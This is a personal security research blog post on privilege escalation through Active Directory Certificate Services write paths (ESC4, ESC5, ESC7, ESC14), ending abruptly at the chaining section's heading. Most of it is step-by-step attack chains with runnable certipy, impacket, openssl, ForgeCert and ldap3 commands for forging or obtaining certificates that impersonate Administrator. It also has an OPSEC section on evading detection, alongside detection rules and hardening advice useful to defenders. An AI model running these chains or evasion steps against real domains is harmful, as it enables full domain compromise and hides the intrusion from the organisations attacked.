---
title: "AD CS Abuse Research"
date: 2026-06-04
categories: [Personal]
tags: [Windows, Active Directory, ADCS, Certificates, Privilege Escalation, Research]
published: true
---

## AD Object Write Class: ESC4, ESC5, ESC7, ESC14

### Table of Contents

1. [The AD Object Write Class](#1-the-ad-object-write-class)
2. [AD ACL Primer for PKI Objects](#2-ad-acl-primer-for-pki-objects)
3. [ESC4: Template Object Write](#3-esc4-template-object-write)
4. [ESC5: PKI Object and CA Computer Write](#4-esc5-pki-object-and-ca-computer-write)
5. [ESC7: CA ACL Abuse (ManageCA / Manage Certificates)](#5-esc7-ca-acl-abuse-manageca--manage-certificates)
6. [ESC14: altSecurityIdentities Write](#6-esc14-altsecurityidentities-write)
7. [OPSEC Profile: AD Object Write Class](#7-opsec-profile-ad-object-write-class)
8. [Detection and Defensive Indicators](#8-detection-and-defensive-indicators)
9. [Chaining the AD Object Write Class](#9-chaining-the-ad-object-write-class)

---

## 1. The AD Object Write Class

The AD object write class groups ESC techniques that share a common entry condition: the attacker holds a write primitive on an Active Directory or PKI object, and that primitive is sufficient to introduce or directly exploit a certificate-based authentication path. The write target varies: it might be a certificate template object, the CA computer object, the CA configuration object in the Enrollment Services container, or an arbitrary user or computer account object. What unifies the class is that no pre-existing template misconfiguration is required. The vulnerability is the write access itself.

This distinguishes the class from ESC1, ESC2, ESC3, ESC6, ESC9, and ESC10, which all require a template or CA that is *already* misconfigured. In the AD object write class, the attacker creates the misconfiguration as part of the attack, or in the case of ESC14, bypasses the template layer entirely by writing a direct credential mapping onto an AD account object.

The practical implication for enumeration is that tooling must look beyond template flags and enrollment permissions. A template that appears entirely safe in isolation becomes exploitable the moment an attacker has `WriteProperty` on its AD object. The attack surface is therefore the union of existing misconfigurations *and* reachable write paths to PKI objects.

### Escalation Impact by Target Object

| Write Target | ESC | Maximum Impact |
|---|---|---|
| Certificate template object | ESC4 | Domain compromise via certificate impersonation |
| PKI container / NTAuthCertificates | ESC5 | Domain compromise via CA trust manipulation |
| CA configuration object (Enrollment Services) | ESC7 | Domain compromise via CA flag/template manipulation |
| CA computer object | ESC5 | Domain compromise via CA service control |
| User / computer account object (`altSecurityIdentities`) | ESC14 | Account takeover for any writable principal |

---

## 2. AD ACL Primer for PKI Objects

Before covering each ESC, it is worth being precise about which ACE types matter and what each grants. AD access control is more granular than file system ACLs and the distinctions matter for both exploitation and detection.

### ACE Types

**`GenericAll`**: full control. Equivalent to owning the object. Grants all rights below.

**`GenericWrite`**: write access to all non-protected attributes on the object. Does not grant the right to modify the DACL or take ownership, but allows writing any attribute value including security-sensitive ones like `mspki-certificate-name-flag` or `altSecurityIdentities`.

**`WriteProperty`**: write access to a specific property or property set. More granular than `GenericWrite`; an ACE might grant `WriteProperty` only on the `mspki-enrollment-flag` attribute, not on all attributes. Requires knowing which property the ACE covers.

**`WriteDacl`**: permission to modify the object's own DACL. An attacker with `WriteDacl` can grant themselves or another principal any right on the object, including `GenericAll`. This is often as powerful as `GenericAll` itself.

**`WriteOwner`**: permission to change the object's owner. Once an attacker takes ownership, they implicitly have `WriteDacl` and can grant themselves full control.

**`ExtendedRight`**: access to a specific extended right. The two relevant ones for CA objects are `Certificate-Enrollment` (covered in the first writeup) and the CA management rights discussed in ESC7.

### Where These ACEs Live for PKI Objects

Certificate template objects sit at:
```
CN=<TemplateName>,CN=Certificate Templates,CN=Public Key Services,
CN=Services,CN=Configuration,DC=domain,DC=com
```

The CA configuration object (Enrollment Services entry) sits at:
```
CN=<CAName>,CN=Enrollment Services,CN=Public Key Services,
CN=Services,CN=Configuration,DC=domain,DC=com
```

The CA computer object (the actual machine account) sits at:
```
CN=<CAHostname>,CN=Computers,DC=domain,DC=com
```
(or wherever computer objects are stored if moved from the default container)

The `NTAuthCertificates` object sits at:
```
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,
CN=Configuration,DC=domain,DC=com
```

All of these are readable by any authenticated user via LDAP. Their `nTSecurityDescriptor` attributes (which contain the DACLs) are readable by default, which is why tools like Certipy and BloodHound can enumerate these paths without elevated privileges.

### BloodHound Edges Relevant to This Class

BloodHound models these write paths as edges on the graph. The edges to look for when hunting AD object write class paths:

- `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteDacl`, `WriteOwner` on template objects → ESC4
- `GenericAll`, `GenericWrite`, `WriteProperty`, `WriteDacl`, `WriteOwner` on CA computer object or PKI container objects → ESC5
- `ManageCA` or `ManageCertificates` extended right on CA enrollment services object → ESC7
- `GenericWrite`, `WriteProperty` on user/computer objects (specifically `altSecurityIdentities`) → ESC14

---

## 3. ESC4: Template Object Write

### Vulnerability Class

ESC4 is a write primitive on a certificate template AD object that allows the attacker to modify the template's configuration attributes, introducing ESC1 conditions (enrollee-supplied SAN plus auth EKU) and then immediately exploiting them. The template does not need to be misconfigured beforehand; the misconfiguration is introduced as part of the attack and can optionally be restored afterward.

### Prerequisites

1. A write primitive (`GenericWrite`, `WriteProperty` covering the relevant attributes, `WriteDacl`, or `WriteOwner`) on a certificate template object in `CN=Certificate Templates`
2. The modified template must be published on an accessible CA (check `certificateTemplates` on the CA object in `CN=Enrollment Services`)
3. The attacker (or an account they control) must have `Certificate-Enrollment` rights on the template and on the CA, or be able to grant those rights via the write primitive

Condition 3 is often satisfied automatically: if the attacker has `GenericWrite` on the template, they can write the `nTSecurityDescriptor` attribute to grant themselves enrollment rights. If they have `WriteDacl`, they can add an ACE to the DACL directly.

### What Gets Modified

To convert a safe template into an ESC1-exploitable one, two attribute changes are required:

**`mspki-certificate-name-flag`**: set bit `0x00000001` (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`). This instructs the CA to accept Subject and SAN values from the CSR rather than sourcing them from AD.

**`pKIExtendedKeyUsage`**: ensure an auth-enabling EKU is present. If the template already has Client Authentication (`1.3.6.1.5.5.7.3.2`) or Smart Card Logon (`1.3.6.1.4.1.311.20.2.2`), no change is needed. If it does not, add one.

Optionally, if manager approval is enabled (`CT_FLAG_PEND_ALL_REQUESTS` in `mspki-enrollment-flag`), clear that bit to allow immediate issuance.

### Attack Chain

**Step 1: Identify the write path**

Enumerate template DACLs for write ACEs on the controlled principal or groups it belongs to. Certipy's `find` command surfaces these as `[!] Vulnerable` findings. BloodHound will show the edge from the principal to the template object.

**Step 2: Backup current template attributes**

Before modifying, record the current values of `mspki-certificate-name-flag` and `pKIExtendedKeyUsage`. This is both OPSEC (to restore after exploitation) and necessary to understand what changes are required.

```bash
certipy template -u attacker@domain.com -p Password1 \
  -template 'TargetTemplate' -save-old
```

**Step 3: Modify the template**

Set `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and ensure an auth EKU is present.

```bash
certipy template -u attacker@domain.com -p Password1 \
  -template 'TargetTemplate' \
  -write-default-configuration
```

For manual attribute modification via LDAP (relevant for tooling):

```python
# ldap3 example
conn.modify(
    template_dn,
    {
        'mspki-certificate-name-flag': [(MODIFY_REPLACE, [1])],
        'pKIExtendedKeyUsage': [(MODIFY_REPLACE, ['1.3.6.1.5.5.7.3.2'])]
    }
)
```

**Step 4: Enroll a certificate with an arbitrary SAN**

With the template now in ESC1 state, request a certificate specifying the target principal's UPN in the SAN.

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'TargetTemplate' \
  -upn administrator@domain.com \
  -dc-ip 10.10.10.10
```

**Step 5: Restore the template**

Revert `mspki-certificate-name-flag` and `pKIExtendedKeyUsage` to their original values.

```bash
certipy template -u attacker@domain.com -p Password1 \
  -template 'TargetTemplate' -restore-old
```

**Step 6: Authenticate**

Use the issued certificate for PKINIT to obtain a TGT for the impersonated principal.

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### Attribute Write Granularity

An important nuance: not all write primitives grant access to all attributes. A `WriteProperty` ACE may cover only a specific attribute or a property set rather than the whole object. Before assuming ESC4 is exploitable, verify the ACE covers the specific attributes needed (`mspki-certificate-name-flag`, `pKIExtendedKeyUsage`).

The `User-Force-Change-Password` extended right, for example, is a `WriteProperty` ACE scoped to the `userPassword` property set, so it would not grant write access to template configuration attributes even though it appears as a write permission on the object. Attribute-scoped ACEs are identifiable by the `ObjectType` GUID in the ACE structure; a null GUID means the ACE applies to all attributes.

---

## 4. ESC5: PKI Object and CA Computer Write

### Vulnerability Class

ESC5 covers write access to the higher-level PKI infrastructure objects rather than individual templates. Because these objects sit above the template layer in the trust hierarchy, write access here has broader impact, potentially affecting every template published on the CA or the CA's trustworthiness to the entire domain.

The SpecterOps research groups several distinct scenarios under ESC5. They share the condition of write access to sensitive PKI container objects or the CA computer object itself.

### Target Objects and Their Impact

**`CN=Public Key Services` container**: the root container for all AD CS configuration. `GenericWrite` here could allow creating new child objects (new fake CAs, new templates), modifying the container's DACL to grant further rights, or modifying child objects. In practice this is rarely writable by non-privileged accounts.

**`CN=NTAuthCertificates` object**: the single most critical PKI object in the forest from a trust perspective. This object's `cACertificate` attribute contains the certificates of every CA trusted for PKINIT and smart card logon by domain controllers. Adding a rogue CA certificate here makes the KDC trust certificates issued by that CA for domain authentication, which is the basis of the Golden Certificate / rogue CA technique. Write access to this object is the highest-impact PKI misconfiguration short of owning the CA private key directly.

**`CN=Enrollment Services` container**: write access here allows creating new fake CA objects or modifying existing ones, including changing the `certificateTemplates` attribute on a CA to publish additional templates.

**CA computer object** (`CN=<CAHostname>,CN=Computers,...`): the machine account for the CA server itself. Write access to this object (specifically the ability to set an SPN or write `msDS-AllowedToActOnBehalfOfOtherIdentity`) enables RBCD-based compromise of the CA machine. Owning the CA machine account leads to owning the CA service, private key access, and arbitrary certificate issuance.

### Attack Chain: NTAuthCertificates Write (Golden Certificate Setup)

This is the highest-impact ESC5 chain. Requires write access to `CN=NTAuthCertificates`.

**Step 1: Generate a rogue CA key pair and self-signed certificate**

```bash
# Using openssl to generate a rogue CA
openssl genrsa -out rogue-ca.key 4096
openssl req -new -x509 -key rogue-ca.key -out rogue-ca.crt \
  -days 3650 -subj "/CN=RogueCA/DC=domain/DC=com"
```

**Step 2: Add the rogue CA certificate to NTAuthCertificates**

```bash
certutil -dspublish -f rogue-ca.crt NTAuthCA
# Or via ldap3: append DER-encoded cert to cACertificate multi-value attribute
```

**Step 3: Forge certificates signed by the rogue CA**

With the rogue CA trusted by the domain, forge certificates for any principal, signed by the rogue CA's private key. The KDC will accept them for PKINIT because it trusts the signing CA.

```bash
# ForgeCert or similar tooling to forge a certificate for the DA
ForgeCert.exe --CaCertPath rogue-ca.pfx --CaCertPassword '' \
  --Subject "CN=Administrator" --SubjectAltName "administrator@domain.com" \
  --NewCertPath admin.pfx --NewCertPassword ''
```

**Step 4: Authenticate**

```bash
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
```

### Attack Chain: CA Computer Object Write (RBCD to CA)

If the attacker has `GenericWrite` on the CA computer object:

**Step 1: Write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the CA computer**

Configure RBCD to allow the attacker-controlled machine account to impersonate any user to the CA machine.

```bash
impacket-rbcd -action write -delegate-to 'CA$' \
  -delegate-from 'AttackerMachine$' \
  -dc-ip 10.10.10.10 domain.com/attacker:Password1
```

**Step 2: Obtain a service ticket for the CA machine as a privileged account**

```bash
impacket-getST -spn 'cifs/ca.domain.com' \
  -impersonate Administrator \
  -dc-ip 10.10.10.10 domain.com/'AttackerMachine$':MachinePassword
```

**Step 3: Use the service ticket for remote access to the CA**

With CIFS access to the CA as Administrator, dump the CA private key via `certsrv` service manipulation or `cerutil -backupkey`, enabling arbitrary certificate forgery without touching `NTAuthCertificates`.

---

## 5. ESC7: CA ACL Abuse (ManageCA / Manage Certificates)

### Vulnerability Class

ESC7 targets the CA object in `CN=Enrollment Services` specifically: not individual templates, not the CA computer, but the CA's own configuration object. Two distinct extended rights on this object create different exploitation paths: `ManageCA` and `Manage Certificates`.

### The ManageCA Right

`ManageCA` (`CA Administrator`) grants the ability to modify the CA's configuration. This includes:

- Setting `EDITF_ATTRIBUTESUBJECTALTNAME2` (the ESC6 CA-level SAN flag that makes every template on the CA accept attacker-supplied SANs)
- Publishing new templates to the CA (modifying the `certificateTemplates` attribute)
- Adding principals to the CA officer and CA manager roles
- Modifying the CA's CRL settings, audit settings, and other configuration

The most direct ESC7 chain uses `ManageCA` to enable `EDITF_ATTRIBUTESUBJECTALTNAME2`, converting every auth-EKU template on the CA into an ESC1-exploitable state simultaneously, then enrolling a certificate with an arbitrary SAN.

### The Manage Certificates Right

`Manage Certificates` (`CA Officer` or `Certificate Manager`) grants the ability to approve or deny pending certificate requests. On its own this is less immediately powerful than `ManageCA`, but it enables a specific chain:

If a template has `CT_FLAG_PEND_ALL_REQUESTS` set (manager approval required), requests against it sit in a pending queue rather than being issued immediately. Normally this is a security control. With `Manage Certificates`, the attacker can submit a request to such a template (including one that has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set, i.e. an ESC1 template that requires approval) and then approve their own request.

### ESC7 Chain 1: ManageCA → ESC6 → ESC1

**Step 1: Confirm ManageCA access**

```bash
certipy find -u attacker@domain.com -p Password1 -dc-ip 10.10.10.10
# Look for: [!] CA 'CA-NAME' - ManageCA: attacker
```

**Step 2: Enable EDITF_ATTRIBUTESUBJECTALTNAME2**

```bash
certipy ca -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -enable-all-templates \
  -dc-ip 10.10.10.10

# Or specifically set the flag:
certipy ca -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -config 'EDITF_ATTRIBUTESUBJECTALTNAME2' \
  -dc-ip 10.10.10.10
```

At the RPC level, this calls `ICertAdminD2::SetConfigEntry` to write the flag into the CA's registry-backed configuration. The CA service reads this flag at request processing time, so the change takes effect immediately without a service restart.

**Step 3: Enroll against any auth-EKU template with an arbitrary SAN**

With the CA-level SAN flag enabled, any template that has an auth EKU and allows enrollment accepts an attacker-supplied SAN regardless of the template's own `mspki-certificate-name-flag`.

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'User' \
  -upn administrator@domain.com \
  -dc-ip 10.10.10.10
```

**Step 4: Restore the flag (optional)**

```bash
certipy ca -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -disable-all-templates \
  -dc-ip 10.10.10.10
```

**Step 5: Authenticate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ESC7 Chain 2: ManageCA → SubCA Template → Manage Certificates → Approve

This chain is useful when `EDITF_ATTRIBUTESUBJECTALTNAME2` modification is monitored or when a cleaner approach is preferred. The SubCA template (if published or publishable) allows issuance of subordinate CA certificates with arbitrary subjects.

**Step 1: Enable the SubCA template on the CA using ManageCA**

```bash
certipy ca -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -enable-template SubCA \
  -dc-ip 10.10.10.10
```

**Step 2: Request a certificate from SubCA with an arbitrary SAN**

The SubCA template has `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set by design (subordinate CAs need to specify their own subject). The request will be placed in the pending queue.

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template SubCA \
  -upn administrator@domain.com \
  -dc-ip 10.10.10.10
# Note the request ID from the output
```

**Step 3: Approve the pending request using Manage Certificates**

```bash
certipy ca -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -issue-request <REQUEST_ID> \
  -dc-ip 10.10.10.10
```

**Step 4: Retrieve the issued certificate**

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -retrieve <REQUEST_ID> \
  -dc-ip 10.10.10.10
```

**Step 5: Authenticate**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### ManageCA vs Manage Certificates: Which Is More Common

`ManageCA` is typically held by Domain Admins and Enterprise Admins by default, so finding it on a lower-privilege account is genuinely misconfigured. `Manage Certificates` is sometimes delegated to helpdesk or IT admin accounts for certificate approval workflows, making it a more realistic finding in real environments. The SubCA chain using only `Manage Certificates` (combined with the assumption that SubCA is already published) is the path most likely to appear in an actual engagement.

---

## 6. ESC14: altSecurityIdentities Write

### Vulnerability Class

ESC14 is a certificate-to-account mapping manipulation. Rather than abusing a template misconfiguration or a CA configuration flaw, it exploits write access to the `altSecurityIdentities` attribute on an AD user or computer object. Writing a crafted value to this attribute instructs the KDC to accept a specific certificate (one the attacker already controls) as a valid credential for that account. No template flags, no CA configuration changes, no UPN manipulation required.

ESC14 sits at the intersection of the AD object write class and PKINIT mapping mechanics. Understanding both is necessary to fully grasp the attack.

### The `altSecurityIdentities` Attribute in Detail

`altSecurityIdentities` is a multi-valued string attribute on AD user and computer objects. Each value defines an explicit mapping between an external credential and the AD account. The KDC checks this attribute during PKINIT as an alternative to UPN-based lookup. If the presented certificate matches any value in the target account's `altSecurityIdentities`, the KDC maps the authentication to that account.

The mapping format for X.509 certificates follows the pattern `X509:<field-identifier>value`. The relevant identifiers:

**`X509:<I><S>`**: Issuer and Subject match. The most specific form. The value encodes both the issuer DN and the subject DN of a specific certificate:
```
X509:<I>DC=com,DC=corp,CN=CorpCA<S>DC=com,DC=corp,CN=John Smith
```
The KDC validates that the presented cert's issuer DN and subject DN match exactly.

**`X509:<SKI>`**: Subject Key Identifier match. The value is the hex-encoded SKI extension value from the certificate:
```
X509:<SKI>aabbccddeeff00112233445566778899aabbccdd
```
The SKI is a hash of the certificate's public key material, computed by the CA at issuance and embedded as an extension. Matching on SKI means any cert with that public key will be accepted.

**`X509:<SHA1-PUKEY>`**: SHA-1 hash of the public key:
```
X509:<SHA1-PUKEY>aabbccddeeff00112233445566778899aabbccdd
```

**`X509:<RFC822>`**: Email address match:
```
X509:<RFC822>john.smith@corp.local
```

**`X509:<UPN>`**: UPN match (different from the standard UPN SAN lookup; this is an explicit mapping):
```
X509:<UPN>john.smith@corp.local
```

For ESC14 exploitation, the most useful form is `X509:<I><S>` or `X509:<SKI>` because they tie the mapping to a specific certificate the attacker controls rather than to a UPN that might match other certs.

### Prerequisites

1. Write access to the `altSecurityIdentities` attribute on a target AD account (via `GenericWrite`, `WriteProperty` scoped to `altSecurityIdentities`, or `GenericAll` on the account object)
2. A certificate the attacker can authenticate with, either already obtained from the CA via any enrollment path or self-signed if the domain's PKINIT configuration accepts certificates from the target account's own certificate store (rare but possible)
3. The target account's `altSecurityIdentities` write must not be blocked by a Protected Users group membership or other hardening (Protected Users members have additional restrictions but `altSecurityIdentities` itself is not inherently blocked)

Condition 2 is the key distinguishing requirement: unlike ESC9 where the cert gets its power from the UPN embedded at issuance, ESC14 requires that the attacker already possess a usable certificate. The typical prerequisite chain is: compromise a low-privilege account, obtain a certificate for that account via normal enrollment, find `GenericWrite` on a higher-privilege account, write `altSecurityIdentities` mapping the owned cert to the higher-privilege account, then authenticate as the higher-privilege account using the owned cert.

### Attack Chain

**Step 1: Obtain a certificate for the attacker-controlled account**

Enroll a certificate using any available template with an auth EKU. This does not need to be a misconfigured template; a standard User template is sufficient. The certificate's subject and SAN will reflect the attacker's own account.

```bash
certipy req -u attacker@domain.com -p Password1 \
  -ca 'CA-NAME' -template 'User' \
  -dc-ip 10.10.10.10
# Save the .pfx output
```

**Step 2: Extract the certificate details needed for the mapping value**

The `altSecurityIdentities` value needs to encode the issuer DN and subject DN of the obtained certificate. Extract these from the PFX.

```bash
certipy cert -pfx attacker.pfx -nokey -out attacker.crt
openssl x509 -in attacker.crt -noout -issuer -subject
# issuer=DC=com, DC=corp, CN=CorpCA
# subject=DC=com, DC=corp, CN=attacker
```

Note: the DN must be encoded in the reverse order used by OpenSSL (RFC 4514 vs X.500 ordering). The `altSecurityIdentities` format uses X.500 ordering (most significant component first):
```
X509:<I>DC=com,DC=corp,CN=CorpCA<S>DC=com,DC=corp,CN=attacker
```

**Step 3: Write the altSecurityIdentities value to the target account**

```bash
# Certipy (if supported for this operation)
certipy account update -u attacker@domain.com -p Password1 \
  -user targetuser \
  -altSecurityIdentities 'X509:<I>DC=com,DC=corp,CN=CorpCA<S>DC=com,DC=corp,CN=attacker' \
  -dc-ip 10.10.10.10

# ldap3 equivalent
conn.modify(
    target_user_dn,
    {'altSecurityIdentities': [(MODIFY_REPLACE,
      ['X509:<I>DC=com,DC=corp,CN=CorpCA<S>DC=com,DC=corp,CN=attacker'])]}
)
```

**Step 4: Authenticate as the target account using the attacker's certificate**

```bash
certipy auth -pfx attacker.pfx -username targetuser \
  -domain domain.com -dc-ip 10.10.10.10
```

The KDC will process the PKINIT AS-REQ, find no UPN match for the attacker's cert in normal lookup, but will find a matching `altSecurityIdentities` value on the target account, and issue a TGT for the target account.

**Step 5: Cleanup**

Remove the written `altSecurityIdentities` value to restore the target account's original state.

```bash
conn.modify(
    target_user_dn,
    {'altSecurityIdentities': [(MODIFY_DELETE,
      ['X509:<I>DC=com,DC=corp,CN=CorpCA<S>DC=com,DC=corp,CN=attacker'])]}
)
```

### Interaction with Strong Mapping (KB5014754)

ESC14 is largely unaffected by `StrongCertificateBindingEnforcement` because `altSecurityIdentities` is itself a strong mapping mechanism: an explicit, administrator-set binding between a certificate and an account. The KDC treats a match on `altSecurityIdentities` as an authoritative mapping and does not require `szOID_NTDS_CA_SECURITY_EXT` to be present in the certificate for this path.

This makes ESC14 more robust than ESC9/ESC10 in environments that have deployed KB5014754 enforcement mode. While ESC9 fails in full enforcement, ESC14 continues to work because the trust path goes through an explicit account attribute rather than through the extension-based SID validation.

---

## 7. OPSEC Profile: AD Object Write Class

The AD object write class generates a different log signature than ESC9/ESC10. The suspicious activity appears at the point of object modification (template attribute changes, CA configuration changes, or account attribute writes) rather than only at authentication time. This means there are two distinct detection windows: the modification event and the subsequent certificate issuance/authentication events.

### ESC4 Event Signature

**Event ID 4899 (Certificate Services template was changed)** (CA Security Log): Generated on the CA when a template's attributes are modified. Includes the template name and the identity of the account that made the change. This is the primary detection indicator for ESC4. The event fires when the CA detects the template change. It polls for template modifications periodically, so there may be a delay between the LDAP write and the 4899 event.

**Event ID 5136 (Directory Service Object Modified)** (DC Security Log): Generated on the DC when any AD object attribute is modified, if "Audit Directory Service Changes" is enabled. For ESC4, this will fire when `mspki-certificate-name-flag` or `pKIExtendedKeyUsage` is written on the template object. The event includes the object DN, the attribute modified, the old value, and the new value. This is a high-fidelity indicator but requires Directory Service Change auditing to be enabled, which is not the default in many environments.

**Event ID 4886 (Certificate Issued)** (CA Security Log): The issuance event following the template modification. The combination of a 4899 (template changed) followed quickly by a 4886 (cert issued) from the same account, then another 4899 (template restored), is a near-certain ESC4 indicator sequence.

**Timing window**: the window between template modification and restoration is the key forensic artefact. Even if auditing is not enabled for the attribute change, a template that briefly had `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` set will be detectable via CA certificate database forensics, because the issued cert will have a SAN that does not correspond to the requester's actual AD identity.

### ESC5 Event Signature

**Event ID 5136** (DC Security Log): Fires for modifications to `CN=NTAuthCertificates` (`cACertificate` attribute), PKI container objects, or the CA computer object. The object DN in the event immediately identifies which PKI object was touched.

**Event ID 4898 (Certificate Services configuration changed)** (CA Security Log): Generated when CA configuration is modified. Relevant for changes to the Enrollment Services object.

For the RBCD-to-CA-machine chain, the RBCD write generates a 4742 (Computer Account Changed) event on the DC when `msDS-AllowedToActOnBehalfOfOtherIdentity` is written on the CA computer object.

### ESC7 Event Signature

**Event ID 4898 (Certificate Services configuration changed)** (CA Security Log): Generated when `EDITF_ATTRIBUTESUBJECTALTNAME2` is toggled or when the CA's template list is modified. Includes the CA name and what changed. This is the primary ESC7 indicator.

**Event ID 4887 (Certificate approved and certificate issued)** (CA Security Log): When `Manage Certificates` is used to approve a pending request, 4887 fires instead of 4886. Seeing 4887 events from a non-CA-administrator account is suspicious.

**Event ID 4886** (CA Security Log): Issuance after ESC7 exploitation. Again, the combination of a 4898 (CA config changed) followed by 4886 (cert issued with suspicious SAN) followed by 4898 (config restored) is the tell.

### ESC14 Event Signature

**Event ID 5136** (DC Security Log): `altSecurityIdentities` attribute modified on a user or computer object. The event will show the object DN, attribute name (`altSecurityIdentities`), the new value (the X509 mapping string), and the modifying account. This is a high-fidelity indicator. Legitimate `altSecurityIdentities` modifications are rare outside of specific smart card deployments and should always be investigated.

**Event ID 4738 (User Account Changed)** (DC Security Log): Also generated for attribute changes on user objects. Less specific than 5136 but more likely to be forwarded to SIEM in environments without Directory Service Change auditing.

**Event ID 4768** (DC Security Log, KDC): The PKINIT TGT request following ESC14 exploitation. Pre-Authentication Type `17` (PKINIT-DH). The account name in the event will be the target account, not the attacker's account, since the TGT is issued for the target. Combine with the preceding 5136 to correlate the modification with the authentication.

### Noise Profile

| Activity | Event | Log Location | Default Enabled |
|---|---|---|---|
| Template attribute write | 5136 | DC Security Log | No (requires DS Change audit) |
| CA template change detection | 4899 | CA Security Log | Only if CA audit enabled |
| CA configuration change | 4898 | CA Security Log | Only if CA audit enabled |
| Certificate issued (normal) | 4886 | CA Security Log | Only if CA audit enabled |
| Certificate issued (approved) | 4887 | CA Security Log | Only if CA audit enabled |
| altSecurityIdentities write | 5136 / 4738 | DC Security Log | 4738 yes / 5136 no |
| PKINIT TGT request | 4768 (PreAuth=17) | DC Security Log | Yes |

The most important observation: the majority of high-fidelity indicators (5136, 4899, 4898) require either Directory Service Change auditing or CA audit logging, neither of which is enabled by default in most AD environments. In their absence, the only universally available signals are 4738 for ESC14 and 4768 for PKINIT authentications, both of which require correlation and context to be meaningful.

### OPSEC Hardening for Operators

**For ESC4**: minimise the window between template modification and restoration. Automate the sequence (modify, request, restore) as a single scripted operation rather than manual steps. The 4899 event will still fire, but the template will be in its modified state for seconds rather than minutes. Consider whether the target environment has CA audit logging enabled before proceeding; if not, the only forensic artefact is the issued certificate itself.

**For ESC7**: use the SubCA chain (Chain 2) rather than toggling `EDITF_ATTRIBUTESUBJECTALTNAME2` if possible. Toggling the CA-level flag affects all templates simultaneously and generates a more conspicuous 4898 event. The SubCA approval chain is quieter because it uses the template's intended pending-approval workflow. However, enabling the SubCA template itself also generates a 4898 if the template was not previously published.

**For ESC14**: the `altSecurityIdentities` write and subsequent restoration generate 4738 events on the DC. These are enabled by default. In environments where 4738 is forwarded to SIEM, the write will be visible. The restoration generates a second 4738. If the target account's `altSecurityIdentities` was previously empty, both events will stand out clearly. Consider whether the TGT obtained via ESC14 can achieve the objective without the `altSecurityIdentities` value needing to be present long-term; in most cases, obtaining the TGT and immediately removing the mapping value is the right approach.

**For all chains**: the issued certificate persists in the CA's database regardless of cleanup. CA administrators can enumerate all issued certificates including their SANs. If the SAN of an issued certificate does not match a legitimate identity (ESC4, ESC7 chains) or the issued cert is for a template that should not produce cross-account authentications (ESC14), this is a detectable artefact via CA database forensics even without real-time alerting.

---

## 8. Detection and Defensive Indicators

### Enable Directory Service Change Auditing

The single highest-impact defensive configuration for this attack class. Enable "Audit Directory Service Changes" in the Default Domain Controllers Policy GPO:

```
Computer Configuration → Policies → Windows Settings →
Security Settings → Advanced Audit Policy Configuration →
DS Access → Audit Directory Service Changes: Success
```

This enables Event ID 5136 for all AD object attribute modifications, including template flags and `altSecurityIdentities`. Without this, write-based ESC attacks leave minimal real-time forensic evidence.

### Enable CA Audit Logging

```
certutil -setreg CA\AuditFilter 127
net stop certsvc && net start certsvc
```

Value `127` enables all CA audit categories. At minimum, enable categories covering certificate issuance (4886, 4887), template changes (4899), and CA configuration changes (4898).

### Specific Detection Rules

**ESC4**: Alert on 5136 events where the object DN is under `CN=Certificate Templates` and the attribute is `mspki-certificate-name-flag` or `pKIExtendedKeyUsage`. Correlate with subsequent 4886 events from the same account within a short time window.

**ESC5**: Alert on any 5136 event where the object DN is `CN=NTAuthCertificates,...` and the attribute is `cACertificate`. Any addition to this attribute outside of a documented CA deployment event is critical. Additionally alert on `msDS-AllowedToActOnBehalfOfOtherIdentity` writes (4742) on the CA computer object.

**ESC7**: Alert on 4898 events. In a stable environment, CA configuration changes should be extremely rare and always change-controlled. Any 4898 from a non-standard administrative account warrants immediate investigation. Additionally alert on 4887 events from accounts that are not documented CA officers.

**ESC14**: Alert on 5136 or 4738 events where `altSecurityIdentities` is modified on any user or computer object. This attribute has almost no legitimate use in environments that do not explicitly use smart cards or external certificate mapping. Any write to it should be treated as a high-severity finding.

### Hardening Recommendations

**Audit template DACLs regularly**: enumerate write ACEs on all certificate templates and remove any that grant write rights to non-administrative principals. Pay particular attention to `GenericWrite`, `WriteDacl`, and `WriteProperty` ACEs for `Domain Users`, `Authenticated Users`, or non-PKI-admin groups.

**Restrict ManageCA and Manage Certificates**: these rights should be held only by documented PKI administrators. Enumerate via Certipy `find` output or PowerShell:

```powershell
$ca = Get-ADObject -Filter {objectClass -eq 'pKIEnrollmentService'} `
  -SearchBase "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,$(([ADSI]'').distinguishedName)" `
  -Properties nTSecurityDescriptor
$ca.nTSecurityDescriptor.Access | Where-Object {
    $_.ActiveDirectoryRights -match 'ExtendedRight' -and
    $_.ObjectType -match '0e10c968|a05b8cc2'
}
```

**Protect `altSecurityIdentities`**: for high-value accounts (Domain Admins, service accounts with DCSync rights, Tier 0 assets), explicitly deny `WriteProperty` on `altSecurityIdentities` for all non-privileged principals. This can be set as an explicit Deny ACE or by ensuring these accounts are in Protected Users (though Protected Users does not directly protect `altSecurityIdentities`, the additional monitoring attention on these accounts compensates).

**Deploy KB5014754 enforcement mode**: while this does not directly stop ESC14 (which uses explicit `altSecurityIdentities` mapping rather than UPN-based weak mapping), it eliminates the fallback paths that make other attack classes in this writeup series easier.

---

## 9. Chaining the AD Object Write Class

These ESCs rarely operate in isolation in real environments. The most impactful chains:

